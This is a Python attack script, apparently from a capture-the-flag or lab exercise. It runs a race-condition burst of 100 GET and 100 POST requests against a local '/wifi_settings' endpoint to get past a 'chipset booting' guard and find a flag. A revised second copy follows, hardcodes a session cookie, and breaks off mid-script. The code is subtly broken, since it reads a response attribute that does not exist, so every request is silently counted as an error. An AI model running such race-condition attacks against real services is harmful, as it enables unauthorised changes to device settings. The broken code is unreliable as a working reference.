import requests
import time
import json

# Target configuration
BASE_URL = "http://127.0.0.1:32992"
LOGIN_URL = f"{BASE_URL}/login"
WIFI_URL = f"{BASE_URL}/wifi_settings"

# Authentication credentials
USERNAME = "test"
PASSWORD = "test"

# Attack configuration
TOTAL_GET = 100
TOTAL_POST = 100

print("[*] Starting Race Condition Attack: Rapid Sequential Mixed GET/POST Burst")
print(f"[*] Configuration: {TOTAL_GET} GET + {TOTAL_POST} POST requests")
print(f"[*] Using rapid sequential execution (single-threaded burst)")

# Step 1: Authenticate and establish session
print("\n[1] Authenticating...")
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 RaceConditionTester/1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
})

login_resp = session.post(LOGIN_URL, data={'username': USERNAME, 'password': PASSWORD}, allow_redirects=False)
print(f"    Login status: {login_resp.status_code}")

# Extract session cookie
cookies = session.cookies.get_dict()
print(f"    Session cookies: {cookies}")

if 'session' not in cookies:
    print("[!] Failed to get session cookie!")
    print(f"    Response: {login_resp.text[:500]}")
else:
    print(f"    Session obtained: {cookies['session'][:30]}...")

# Prepare request queue - alternating GET/POST for interleaved burst
request_queue = []
for i in range(max(TOTAL_GET, TOTAL_POST)):
    if i < TOTAL_GET:
        request_queue.append(('GET', i))
    if i < TOTAL_POST:
        request_queue.append(('POST', i))

print(f"\n[2] Prepared {len(request_queue)} requests in alternating sequence")

# Results tracking structures
all_results = []
results = {
    'GET': {'success': 0, 'boot_error': 0, 'other': 0, 'codes': {}},
    'POST': {'success': 0, 'boot_error': 0, 'other': 0, 'codes': {}}
}

# Step 3: Execute rapid sequential burst
print("\n[3] Executing rapid sequential burst (no delays)...")
start_time = time.time()

for req_type, req_id in request_queue:
    try:
        if req_type == 'GET':
            resp = session.get(WIFI_URL, timeout=5)
        else:  # POST
            resp = session.post(
                WIFI_URL,
                data={'ssid': 'test', 'channel': '6', 'mode': 'g'},
                timeout=5
            )
        
        response_text = resp.text
        status_code = resp.status
        
        # Analyze response for boot error
        has_boot_error = "WiFi chipset is still booting" in response_text
        
        # Check for success keywords
        success_keywords = ['success', 'flag', 'updated', 'saved', 'configured', 'wifi settings updated', 'settings saved']
        has_success = any(keyword in response_text.lower() for keyword in success_keywords)
        
        result = {
            'type': req_type,
            'id': req_id,
            'status': status_code,
            'length': len(response_text),
            'has_boot_error': has_boot_error,
            'has_success': has_success,
            'text': response_text[:1000] if len(response_text) > 1000 else response_text
        }
        
        all_results.append(result)
        
        # Update counters
        results[req_type]['codes'][status_code] = results[req_type]['codes'].get(status_code, 0) + 1
        
        if has_boot_error:
            results[req_type]['boot_error'] += 1
        elif has_success:
            results[req_type]['success'] += 1
        elif req_type == 'POST' and status_code == 200 and not has_boot_error:
            # POST with 200 but no boot error = potential win
            results[req_type]['success'] += 1
        else:
            results[req_type]['other'] += 1
            
    except Exception as e:
        all_results.append({'type': req_type, 'id': req_id, 'error': str(e)})

elapsed = time.time() - start_time
rate = len(request_queue) / elapsed

print(f"\n[4] Attack completed in {elapsed:.2f}s ({rate:.1f} req/s)")

# Step 4: Analyze results
print("\n" + "="*60)
print("RESULTS SUMMARY")
print("="*60)

print(f"\nTotal requests: {len(request_queue)}")
print(f"GET requests attempted: {TOTAL_GET}")
print(f"POST requests attempted: {TOTAL_POST}")

print("\n--- GET Results ---")
get_total = results['GET']['boot_error'] + results['GET']['success'] + results['GET']['other']
print(f"  Completed: {get_total}/{TOTAL_GET}")
print(f"  Boot errors: {results['GET']['boot_error']}")
print(f"  Success indicators: {results['GET']['success']}")
print(f"  Other responses: {results['GET']['other']}")
print(f"  Status codes: {results['GET']['codes']}")

print("\n--- POST Results ---")
post_total = results['POST']['boot_error'] + results['POST']['success'] + results['POST']['other']
print(f"  Completed: {post_total}/{TOTAL_POST}")
print(f"  Boot errors: {results['POST']['boot_error']}")
print(f"  Success indicators: {results['POST']['success']}")
print(f"  Other responses: {results['POST']['other']}")
print(f"  Status codes: {results['POST']['codes']}")

# Find winning responses (POST without boot error)
print("\n" + "="*60)
print("WINNING RESPONSES ANALYSIS")
print("="*60)

winning_posts = [r for r in all_results if r.get('type') == 'POST' and not r.get('has_boot_error', True) and 'error' not in r]
print(f"\nPOST requests WITHOUT 'WiFi chipset is still booting' error: {len(winning_posts)}")

if winning_posts:
    print(f"\n[!] FOUND {len(winning_posts)} potentially successful POST responses!")
    for i, wr in enumerate(winning_posts[:10]):
        print(f"\n  --- Win #{i+1} ---")
        print(f"  Request: POST #{wr['id']}")
        print(f"  Status: {wr['status']}")
        print(f"  Length: {wr['length']} bytes")
        print(f"  Has success keyword: {wr.get('has_success', False)}")
        print(f"  Response text:\n{wr['text'][:1200]}")
        print()
else:
    print("  No POST responses without boot errors found")

# Check for FLAG
print("\n" + "="*60)
print("FLAG SEARCH")
print("="*60)

flag_found = False
flag_responses = []
for r in all_results:
    if 'text' in r and 'FLAG' in r['text'].upper():
        flag_found = True
        flag_responses.append(r)
        print(f"\n[!] FLAG FOUND in {r['type']} request #{r['id']}!")
        print(f"    Status: {r['status']}")
        print(f"    Full response:\n{r['text']}")

if not flag_found:
    print("  No FLAG found in any response")

# Sample boot error responses for comparison
print("\n" + "="*60)
print("SAMPLE BOOT ERROR RESPONSES (for comparison)")
print("="*60)

boot_errors = [r for r in all_results if r.get('has_boot_error') and r.get('type') == 'POST'][:3]
for i, r in enumerate(boot_errors):
    print(f"\n  --- Boot Error Sample #{i+1} (POST #{r['id']}) ---")
    print(f"  Status: {r['status']}")
    print(f"  Length: {r['length']} bytes")
    print(f"  Response: {r['text'][:600]}")

# Final summary
print("\n" + "="*60)
print("FINAL SUMMARY")
print("="*60)
print(f"Total requests executed: {len(request_queue)}")
print(f"Execution time: {elapsed:.2f} seconds")
print(f"Request rate: {rate:.1f} req/s")
print(f"GET boot errors: {results['GET']['boot_error']}/{TOTAL_GET}")
print(f"POST boot errors: {results['POST']['boot_error']}/{TOTAL_POST}")
print(f"POST successes (no boot error): {len(winning_posts)}")
print(f"FLAG found: {flag_found}")

if len(winning_posts) > 0:
    print(f"\n[!] Strategy Result: SUCCESS - Found {len(winning_posts)} POSTs without boot error")
    print(f"[!] Win rate: {len(winning_posts)/TOTAL_POST*100:.2f}%")
else:
    print(f"\n[-] Strategy Result: No success - All {TOTAL_POST} POSTs returned boot error")
print("="*60)

import requests
import time

# Target configuration
BASE_URL = "http://127.0.0.1:32992"
LOGIN_URL = f"{BASE_URL}/login"
WIFI_URL = f"{BASE_URL}/wifi_settings"

# Authentication credentials
USERNAME = "test"
PASSWORD = "test"

# Attack configuration
TOTAL_GET = 100
TOTAL_POST = 100

print("[*] Starting Race Condition Attack: Rapid Sequential Mixed GET/POST Burst (Fixed Auth)")
print(f"[*] Configuration: {TOTAL_GET} GET + {TOTAL_POST} POST requests")

# Step 1: Authenticate and establish session - FOLLOW REDIRECTS
print("\n[1] Authenticating (with redirect following)...")
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 RaceConditionTester/1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
})

# Login and follow redirects to establish session properly
login_resp = session.post(LOGIN_URL, data={'username': USERNAME, 'password': PASSWORD}, allow_redirects=True)
print(f"    Initial login status: {login_resp.history[0].status if login_resp.history else login_resp.status_code}")
print(f"    Final status: {login_resp.status_code}")

# Check cookies after redirects
cookies = session.cookies.get_dict()
print(f"    Session cookies after auth: {cookies}")

if 'session' not in cookies:
    print("[!] Trying alternative auth method...")
    # Try to see what the redirect response gives us
    login_resp2 = session.post(LOGIN_URL, data={'username': USERNAME, 'password': PASSWORD}, allow_redirects=False)
    print(f"    No-redirect login status: {login_resp2.status_code}")
    print(f"    Response headers: {dict(login_resp2.headers)}")
    cookies2 = session.cookies.get_dict()
    print(f"    Cookies (no redirect): {cookies2}")
    
    if 'session' in cookies2:
        cookies = cookies2
        print(f"    Session obtained (no redirect): {cookies2['session'][:30]}...")
else:
    print(f"    Session obtained: {cookies['session'][:30]}...")

# If still no session, use the cookie from context
if 'session' not in cookies:
    print("[!] Using session from context: ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8...")
    session.cookies.set('session', 'ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8')
    cookies = {'session': 'ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8'}

# Test the session with a GET first
